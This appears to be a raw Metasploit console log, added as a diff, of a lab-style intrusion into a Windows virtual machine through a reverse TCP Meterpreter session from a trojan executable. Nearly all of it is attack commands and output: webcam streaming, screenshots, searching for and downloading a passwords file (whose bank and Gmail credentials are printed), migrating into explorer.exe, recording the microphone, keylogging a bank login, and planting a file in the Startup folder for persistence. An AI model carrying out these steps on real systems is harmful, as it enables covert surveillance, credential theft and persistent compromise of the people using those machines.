@@ -1,0 +1,636 @@
+[1m[34m[*][0m Spooling to file trojans.file...
+[4mmsf6[0m [0m> use exploit/multi/handler 
+[0m[1m[34m[*][0m Using configured payload generic/shell_reverse_tcp
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> set payload windows/meterpreter/reverse_tcp
+[0mpayload => windows/meterpreter/reverse_tcp
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> set lhost 192.168.92.129
+[0mlhost => 192.168.92.131
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> set p[Klport 1234
+[0mlport => 1234
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 192.168.92.129:1234 
+[1m[34m[*][0m Sending stage (175686 bytes) to 192.168.92.131
+[0m[0m[1m[34m[*][0m Meterpreter session 1 opened (192.168.92.129:1234 -> 192.168.92.131:49874) at 2022-09-08 06:38:40 -0400
+
+[0m[4mmeterpreter[0m > webcam_list 
+[0m1: GC21 Video
+[4mmeterpreter[0m > webco[Kam_list [K[K[K[K[Kstream -i 1
+[0m[1m[34m[*][0m Starting...
+[1m[34m[*][0m Preparing player...
+[1m[34m[*][0m Opening player at: /home/kali/aXgmyrgz.html
+[1m[34m[*][0m Streaming...
+[0m[4mmeterpreter[0m > webcam_list 
+[0m1: GC21 Video
+[4mmeterpreter[0m > scren[Kenshot
+[0mScreenshot saved to: /home/kali/hjNkJaMv.jpeg
+[4mmeterpreter[0m > getuid
+[0mServer username: DESKTOP-OD61403\Malware
+[4mmeterpreter[0m > search -h
+[0mUsage: search [-d dir] [-r recurse] -f pattern [-f pattern]...
+Search for files.
+
+OPTIONS:
+
+    -a   Find files modified after timestamp (UTC).  Format: YYYY-mm-dd or YYYY-mm-ddTHH:MM:SS
+    -b   Find files modified before timestamp (UTC). Format: YYYY-mm-dd or YYYY-mm-ddTHH:MM:SS
+    -d   The directory/drive to begin searching from. Leave empty to search all drives. (Default: )
+    -f   A file pattern glob to search for. (e.g. *secret*.doc?)
+    -h   Help Banner
+    -r   Recursively search sub directories. (Default: true)
+
+[4mmeterpreter[0m > search -h[Kf *password*
+[0mFound 120 results...
+====================
+
+Path                                                                                                                                                                                                                                                                                               Size (bytes)  Modified (UTC)
+----                                                                                                                                                                                                                                                                                               ------------  --------------
+c:\Users\Malware\AppData\Roaming\Microsoft\Windows\Recent\passwords.txt.lnk                                                                                                                                                                                                                        939           2022-09-08 06:42:30 -0400
+c:\Users\Malware\Desktop\passwords.txt                                                                                                                                                                                                                                                             101           2022-09-08 06:44:07 -0400
+c:\Windows\Microsoft.NET\Framework64\v4.0.30319\ASP.NETWebAdminFiles\App_Code\PasswordValueTextBox.cs                                                                                                                                                                                              941           2017-09-29 09:44:24 -0400
+c:\Windows\Microsoft.NET\Framework\v4.0.30319\ASP.NETWebAdminFiles\App_Code\PasswordValueTextBox.cs                                                                                                                                                                                                941           2017-09-29 09:44:24 -0400
+
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > search -f *password* c:\\users\\malware\\
+[0mFound 120 results...
+====================
+
+Path                                                                                                                                                                                                                                                                                               Size (bytes)  Modified (UTC)
+----                                                                                                                                                                                                                                                                                               ------------  --------------
+c:\Users\Malware\AppData\Roaming\Microsoft\Windows\Recent\passwords.txt.lnk                                                                                                                                                                                                                        939           2022-09-08 06:42:30 -0400
+c:\Users\Malware\Desktop\passwords.txt                                                                                                                                                                                                                                                             101           2022-09-08 06:44:07 -0400
+c:\Windows\Microsoft.NET\Framework64\v4.0.30319\ASP.NETWebAdminFiles\App_Code\PasswordValueTextBox.cs                                                                                                                                                                                              941           2017-09-29 09:44:24 -0400
+c:\Windows\Microsoft.NET\Framework\v4.0.30319\ASP.NETWebAdminFiles\App_Code\PasswordValueTextBox.cs                                                                                                                                                                                                941           2017-09-29 09:44:24 -0400
+
+[4mmeterpreter[0m > pwd
+[0mC:\Users\Malware\Desktop
+[4mmeterpreter[0m > download c:\Users\Malware\Desktop\passwords.txt\Users\Malware\Desktop\passwords.txt[C[C[C[C[C[C\Malware\Desktop\passwords.txt[C[C[C[C[C[C[C[C[C\Desktop\passwords.txt[C[C[C[C[C[C[C[C[C\passwords.txt
+[0m[1m[34m[*][0m Downloading: c:\Users\Malware\Desktop\passwords.txt -> /home/kali/passwords.txt
+[1m[34m[*][0m Downloaded 101.00 B of 101.00 B (100.0%): c:\Users\Malware\Desktop\passwords.txt -> /home/kali/passwords.txt
+[1m[34m[*][0m download   : c:\Users\Malware\Desktop\passwords.txt -> /home/kali/passwords.txt
+[4mmeterpreter[0m > cat passwords.txt 
+[0m
+Bank
+user: U3BCKZ
+pass: nijs9fuj2p3lk9
+
+
+Gmail
+user: yrtnod@gmail.com
+pass: kr0wtnowti
+
+
+[4mmeterpreter[0m > ps
+[0m
+Process List
+============
+
+ PID   PPID  Name                       Arch  Session  User                     Path
+ ---   ----  ----                       ----  -------  ----                     ----
+ 0     0     [System Process]
+ 4     0     System
+ 64    608   svchost.exe
+ 256   608   svchost.exe
+ 292   4     smss.exe
+ 348   416   ctfmon.exe                 x64   1
+ 396   384   csrss.exe
+ 416   608   svchost.exe
+ 472   384   wininit.exe
+ 480   464   csrss.exe
+ 540   464   winlogon.exe
+ 608   472   services.exe
+ 620   472   lsass.exe
+ 732   608   svchost.exe
+ 748   472   fontdrvhost.exe
+ 756   540   fontdrvhost.exe
+ 852   608   svchost.exe
+ 932   540   dwm.exe
+ 992   608   svchost.exe
+ 1116  732   MicrosoftEdgeCP.exe        x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP
+                                                                                .exe
+ 1164  4     Memory Compression
+ 1232  608   svchost.exe
+ 1240  608   svchost.exe
+ 1260  608   vm3dservice.exe
+ 1308  608   svchost.exe
+ 1348  608   VGAuthService.exe
+ 1356  608   svchost.exe
+ 1364  608   svchost.exe
+ 1376  608   vmtoolsd.exe
+ 1420  608   WinCollectSvc.exe
+ 1472  608   svchost.exe
+ 1524  608   spoolsv.exe
+ 1564  608   svchost.exe
+ 1580  608   svchost.exe
+ 1816  608   SecurityHealthService.exe
+ 2072  608   MsMpEng.exe
+ 2084  732   RuntimeBroker.exe          x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\RuntimeBroker.exe
+ 2272  1260  vm3dservice.exe
+ 2348  608   dllhost.exe
+ 2412  732   RuntimeBroker.exe          x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\RuntimeBroker.exe
+ 2460  1420  WinCollect.exe
+ 2476  2460  conhost.exe
+ 2876  732   WmiPrvSE.exe
+ 2948  732   WmiPrvSE.exe
+ 3084  992   sihost.exe                 x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\sihost.exe
+ 3132  608   msdtc.exe
+ 3192  608   svchost.exe                x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\svchost.exe
+ 3444  992   taskhostw.exe              x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\taskhostw.exe
+ 3860  7100  WSHelper.exe               x86   1        DESKTOP-OD61403\Malware  C:\Program Files (x86)\Common Files\Wondershare\Wondershare Helper Compact\
+                                                                                WSHelper.exe
+ 4048  732   smartscreen.exe            x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\smartscreen.exe
+ 4236  3996  explorer.exe               x64   1        DESKTOP-OD61403\Malware  C:\Windows\explorer.exe
+ 4312  732   MicrosoftEdgeCP.exe        x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP
+                                                                                .exe
+ 4492  732   ShellExperienceHost.exe    x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost
+                                                                                .exe
+ 4840  732   RuntimeBroker.exe          x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\RuntimeBroker.exe
+ 4988  732   RuntimeBroker.exe          x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\RuntimeBroker.exe
+ 5216  732   SkypeBackgroundHost.exe    x64   1        DESKTOP-OD61403\Malware  C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.56.102.0_x64__kzf8qxf38z
+                                                                                g5c\SkypeBackgroundHost.exe
+ 5236  4080  OneDrive.exe               x64   1        DESKTOP-OD61403\Malware  C:\Users\Malware\AppData\Local\Microsoft\OneDrive\OneDrive.exe
+ 5356  608   svchost.exe
+ 5548  732   MicrosoftEdgeCP.exe        x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP
+                                                                                .exe
+ 8504  7104  file1234.exe               x86   1        DESKTOP-OD61403\Malware  C:\Users\Malware\Desktop\file1234.exe
+ 5700  732   MicrosoftEdge.exe          x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.e
+                                                                                xe
+ 5732  608   SearchIndexer.exe
+ 5828  608   svchost.exe
+ 5928  732   ApplicationFrameHost.exe   x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\ApplicationFrameHost.exe
+ 6016  732   RuntimeBroker.exe          x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\RuntimeBroker.exe
+ 6500  4080  MSASCuiL.exe               x64   1        DESKTOP-OD61403\Malware  C:\Program Files\Windows Defender\MSASCuiL.exe
+ 6608  4080  vmtoolsd.exe               x64   1        DESKTOP-OD61403\Malware  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
+ 6960  732   MicrosoftEdgeCP.exe        x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP
+                                                                                .exe
+ 7052  732   dllhost.exe                x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\dllhost.exe
+ 7104  732   browser_broker.exe         x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\browser_broker.exe
+ 7112  732   RuntimeBroker.exe          x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\RuntimeBroker.exe
+ 7708  732   MicrosoftEdgeCP.exe        x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP
+                                                                                .exe
+ 8360  732   MicrosoftEdgeCP.exe        x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP
+                                                                                .exe
+ 8400  732   SearchUI.exe               x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
+ 8432  608   sedsvc.exe
+ 9184  608   svchost.exe
+
+[4mmeterpreter[0m > migrate -N exploir[K[Krer.exe
+[0m[1m[34m[*][0m Migrating from 8504 to 4236...
+[1m[34m[*][0m Migration completed successfully.
+[4mmeterpreter[0m > ps
+[0m
+Process List
+============
+
+ PID   PPID  Name                       Arch  Session  User                     Path
+ ---   ----  ----                       ----  -------  ----                     ----
+ 0     0     [System Process]
+ 4     0     System
+ 64    608   svchost.exe
+ 256   608   svchost.exe
+ 292   4     smss.exe
+ 348   416   ctfmon.exe                 x64   1
+ 396   384   csrss.exe
+ 416   608   svchost.exe
+ 472   384   wininit.exe
+ 480   464   csrss.exe
+ 540   464   winlogon.exe
+ 608   472   services.exe
+ 620   472   lsass.exe
+ 732   608   svchost.exe
+ 748   472   fontdrvhost.exe
+ 756   540   fontdrvhost.exe
+ 852   608   svchost.exe
+ 932   540   dwm.exe
+ 992   608   svchost.exe
+ 1116  732   MicrosoftEdgeCP.exe        x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP
+                                                                                .exe
+ 1164  4     Memory Compression
+ 1232  608   svchost.exe
+ 1240  608   svchost.exe
+ 1260  608   vm3dservice.exe
+ 1308  608   svchost.exe
+ 1348  608   VGAuthService.exe
+ 1356  608   svchost.exe
+ 1364  608   svchost.exe
+ 1376  608   vmtoolsd.exe
+ 1420  608   WinCollectSvc.exe
+ 1472  608   svchost.exe
+ 1524  608   spoolsv.exe
+ 1564  608   svchost.exe
+ 1580  608   svchost.exe
+ 1816  608   SecurityHealthService.exe
+ 2072  608   MsMpEng.exe
+ 2084  732   RuntimeBroker.exe          x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\RuntimeBroker.exe
+ 2272  1260  vm3dservice.exe
+ 2348  608   dllhost.exe
+ 2412  732   RuntimeBroker.exe          x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\RuntimeBroker.exe
+ 2460  1420  WinCollect.exe
+ 2476  2460  conhost.exe
+ 2876  732   WmiPrvSE.exe
+ 2948  732   WmiPrvSE.exe
+ 3084  992   sihost.exe                 x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\sihost.exe
+ 3132  608   msdtc.exe
+ 3192  608   svchost.exe                x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\svchost.exe
+ 3444  992   taskhostw.exe              x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\taskhostw.exe
+ 3860  7100  WSHelper.exe               x86   1        DESKTOP-OD61403\Malware  C:\Program Files (x86)\Common Files\Wondershare\Wondershare Helper Compact\
+                                                                                WSHelper.exe
+ 4048  732   smartscreen.exe            x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\smartscreen.exe
+ 4236  3996  explorer.exe               x64   1        DESKTOP-OD61403\Malware  C:\Windows\explorer.exe
+ 4312  732   MicrosoftEdgeCP.exe        x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP
+                                                                                .exe
+ 4492  732   ShellExperienceHost.exe    x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost
+                                                                                .exe
+ 4840  732   RuntimeBroker.exe          x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\RuntimeBroker.exe
+ 4988  732   RuntimeBroker.exe          x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\RuntimeBroker.exe
+ 5216  732   SkypeBackgroundHost.exe    x64   1        DESKTOP-OD61403\Malware  C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.56.102.0_x64__kzf8qxf38z
+                                                                                g5c\SkypeBackgroundHost.exe
+ 5236  4080  OneDrive.exe               x64   1        DESKTOP-OD61403\Malware  C:\Users\Malware\AppData\Local\Microsoft\OneDrive\OneDrive.exe
+ 5356  608   svchost.exe
+ 5548  732   MicrosoftEdgeCP.exe        x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP
+                                                                                .exe
+ 5700  732   MicrosoftEdge.exe          x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.e
+                                                                                xe
+ 5732  608   SearchIndexer.exe
+ 5828  608   svchost.exe
+ 5928  732   ApplicationFrameHost.exe   x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\ApplicationFrameHost.exe
+ 6016  732   RuntimeBroker.exe          x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\RuntimeBroker.exe
+ 6500  4080  MSASCuiL.exe               x64   1        DESKTOP-OD61403\Malware  C:\Program Files\Windows Defender\MSASCuiL.exe
+ 6608  4080  vmtoolsd.exe               x64   1        DESKTOP-OD61403\Malware  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
+ 6960  732   MicrosoftEdgeCP.exe        x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP
+                                                                                .exe
+ 7052  732   dllhost.exe                x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\dllhost.exe
+ 7104  732   browser_broker.exe         x64   1        DESKTOP-OD61403\Malware  C:\Windows\System32\browser_broker.exe
+ 7708  732   MicrosoftEdgeCP.exe        x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP
+                                                                                .exe
+ 8360  732   MicrosoftEdgeCP.exe        x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP
+                                                                                .exe
+ 8400  732   SearchUI.exe               x64   1        DESKTOP-OD61403\Malware  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
+ 8432  608   sedsvc.exe
+ 9184  608   svchost.exe
+
+[4mmeterpreter[0m > background
+[0m[1m[34m[*][0m Backgrounding session 2...
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                Connection
+  --  ----  ----                     -----------                                ----------
+  2         meterpreter x64/windows  DESKTOP-OD61403\Malware @ DESKTOP-OD61403  192.168.92.129:1234 -> 192.168.92.131:49891 (192.168.92.131)
+
+
+[4mmsf6[0m post([1m[31mwindows/gather/phish_windows_credentials[0m) [0m> record [K_mic[K[K[K[K[K[K[K[K[K[Ksessions 2
+[0m[1m[34m[*][0m Starting interaction with 2...
+
+[4mmeterpreter[0m > op[K[Kt[Khelp
+[0m
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter session (for http/https)
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session
+    ssl_verify                Modify the SSL certificate verification setting
+    transport                 Manage the transport mechanisms
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    del           Delete the specified file
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcat          Read the contents of a local file to the screen
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current process
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target process
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idle
+    keyboard_send  Send keystrokes
+    keyevent       Send key events
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    mouse          Send mouse events
+    screenshare    Watch the remote user desktop in real time
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+
+[4mmeterpreter[0m > record_mic -h
+[0mUsage: record_mic [options]
+
+Records audio from the default microphone.
+
+OPTIONS:
+
+    -d   Number of seconds to record (Default: 1)
+    -f   The wav file path (Default: '/home/kali/[randomname].wav')
+    -h   Help Banner
+    -p   Automatically play the captured audio (Default: 'true')
+
+[4mmeterpreter[0m > bg
+[0m[1m[34m[*][0m Backgrounding session 2...
+[0m[4mmsf6[0m post([1m[31mosx/manage/record_mic[0m) [0m> use 3search type:post record
+[0m
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank    Check  Description
+   -  ----                                           ---------------  ----    -----  -----------
+   0  post/multi/gather/dns_srv_lookup                                normal  No     Multi Gather DNS Service [45mRecord[0m Lookup Scan
+   1  post/multi/manage/[45mrecord[0m_mic                                    normal  No     Multi Manage [45mRecord[0m Microphone
+   2  post/osx/capture/keylog_[45mrecord[0mer                                normal  No     OSX Capture Userspace Keylogger
+   3  post/osx/manage/[45mrecord[0m_mic                                      normal  No     OSX Manage [45mRecord[0m Microphone
+   4  post/osx/manage/webcam                                          normal  No     OSX Manage Webcam
+   5  post/windows/gather/enum_putty_saved_sessions                   normal  No     PuTTY Saved Sessions Enumeration Module
+   6  post/windows/capture/keylog_[45mrecord[0mer                            normal  No     Windows Capture Keystroke [45mRecord[0mer
+   7  post/windows/gather/dnscache_dump                               normal  No     Windows Gather DNS Cache
+   8  post/windows/gather/screen_spy                                  normal  No     Windows Gather Screen Spy
+
+
+Interact with a module by name or index. For example [32minfo 8[0m, [32muse 8[0m or [32muse post/windows/gather/screen_spy[0m
+
+[4mmsf6[0m post([1m[31mosx/manage/record_mic[0m) [0m> use 1
+[0m[4mmsf6[0m post([1m[31mmulti/manage/record_mic[0m) [0m> options 
+[0m
+Module options (post/multi/manage/record_mic):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DURATION  5                no        Number of seconds to record
+   SESSION                    yes       The session to run this module on
+
+[4mmsf6[0m post([1m[31mmulti/manage/record_mic[0m) [0m> set session2[K 2
+[0msession => 2
+[4mmsf6[0m post([1m[31mmulti/manage/record_mic[0m) [0m> run
+[0m
+[1m[34m[*][0m 192.168.92.131 - 20%...
+[1m[34m[*][0m 192.168.92.131 - 40%...
+[1m[34m[*][0m 192.168.92.131 - 60%...
+[1m[34m[*][0m 192.168.92.131 - 80%...
+[1m[34m[*][0m 192.168.92.131 - 100%...
+[1m[34m[*][0m 192.168.92.131 - Audio size: (55169 bytes)
+[1m[32m[+][0m 192.168.92.131 - Audio recording saved: /root/.msf4/loot/20220908065312_default_192.168.92.131_192.168.92.131.a_377326.wav
+[1m[34m[*][0m Post module execution completed
+[4mmsf6[0m post([1m[31mmulti/manage/record_mic[0m) [0m> echo "You haev[K[Kve been hacked by Po[K[Kthe Ncie [K[K[K[Kice gi[Ky[Kut[Kys :)"[K[KD )[K"[K[K" > pwn[K3n[K[Kn3d
+[0m[1m[34m[*][0m exec: echo "You have been hacked by the Nice guys :D" > pwn3d
+
+[4mmsf6[0m post([1m[31mmulti/manage/record_mic[0m) [0m> upload pwn3d
+[0m[1m[31m[-][0m Unknown command: upload
+[4mmsf6[0m post([1m[31mmulti/manage/record_mic[0m) [0m> upload [K[K[K[K[K[K[Ksessions 2
+[0m[1m[34m[*][0m Starting interaction with 2...
+
+[4mmeterpreter[0m > upload pwn3d
+[0m[1m[34m[*][0m uploading  : /home/kali/pwn3d -> pwn3d
+[1m[31m[-][0m core_channel_open: Operation failed: Access is denied.
+[4mmeterpreter[0m > pwd
+[0mC:\Windows\system32
+[4mmeterpreter[0m > cd /[Kc:\\window[K[K[K[K[K[Ks[Kused[K[K[K[K[K[K[K[K[K[K[Kupload -h
+[0mUsage: upload [options] src1 src2 src3 ... destination
+
+Uploads local files and directories to the remote machine.
+
+OPTIONS:
+
+    -h  Help banner
+    -r  Upload recursively
+
+[4mmeterpreter[0m > cd "c:\\users\\malware\\desktop"
+[0m[4mmeterpreter[0m > pd[Kwd
+[0mc:\users\malware\desktop
+[4mmeterpreter[0m > pwdcd "c:\\users\\malware\\desktop"[C[C[C[C[C[C[C[C[C[C[C[C[C[Cupload -h[K[P[P[P[P[P[Ppwdupload pwn3d
+[0m[1m[34m[*][0m uploading  : /home/kali/pwn3d -> pwn3d
+[1m[34m[*][0m Uploaded 41.00 B of 41.00 B (100.0%): /home/kali/pwn3d -> pwn3d
+[1m[34m[*][0m uploaded   : /home/kali/pwn3d -> pwn3d
+[4mmeterpreter[0m > idletime
+[0mUser has been idle for: 30 secs
+[0m[4mmeterpreter[0m > keyscan_start[P[P[P[P[Pidletimekeyscan_start
+[0mStarting the keystroke sniffer ...
+[4mmeterpreter[0m > keyscan_dump
+[0mDumping captured keystrokes...
+bankofamerica.com<CR>
+asdfaosd<Tab>123123<CR>
+
+[1m[34m[*][0m Migration completed successfully.
+[4mmeterpreter[0m > sysinfo
+[0mComputer        : DESKTOP-OD61403
+OS              : Windows 10 (10.0 Build 16299).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+
+[4mmeterpreter[0m > shell
+C:\Windows\system32>cd c:\\users\\malware\\desktop
+
+c:\Users\Malware\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is C8DE-B74F
+
+ Directory of c:\Users\Malware\Desktop
+
+09/08/2022  01:58 PM    <DIR>          .
+09/08/2022  01:58 PM    <DIR>          ..
+09/08/2022  01:44 PM               101 passwords.txt
+09/08/2022  01:55 PM                41 pwn3d
+               2 File(s)            142 bytes
+               2 Dir(s)  93,845,667,840 bytes free
+
+c:\Users\Malware\Desktop>type passwords.txt
+
+Bank
+user: U3BCKZ
+pass: nijs9fuj2p3lk9
+
+
+Gmail
+user: yrtnod@gmail.com
+pass: kr0wtnowti
+
+
+
+c:\Users\Malware\Desktop>type pwn3d
+You have been hacked by the Nice guys :D
+
+c:\Users\Malware\Desktop>[A
+'[A' is not recognized as an internal or external command,
+operable program or batch file.
+
+c:\Users\Malware\Desktop>type pwn3d
+You have been hacked by the Nice guys :D
+
+c:\Users\Malware\Desktop>cd C:\Users\Malware\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+C:\Users\Malware\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>dir
+ Volume in drive C has no label.
+ Volume Serial Number is C8DE-B74F
+
+ Directory of C:\Users\Malware\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+09/01/2022  12:18 PM    <DIR>          .
+09/01/2022  12:18 PM    <DIR>          ..
+               0 File(s)              0 bytes
+               2 Dir(s)  93,845,573,632 bytes free
+
+C:\Users\Malware\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>copy c:\Users\Malware\Desktop\pwn3d .
+        1 file(s) copied.
+
+C:\Users\Malware\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>exit
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > background
+[0m[1m[34m[*][0m Backgrounding session 3...
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> exit
+[0m[1m[34m[*][0m You have active sessions open, to exit anyway type "exit -y"
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> exit -y
+[0m
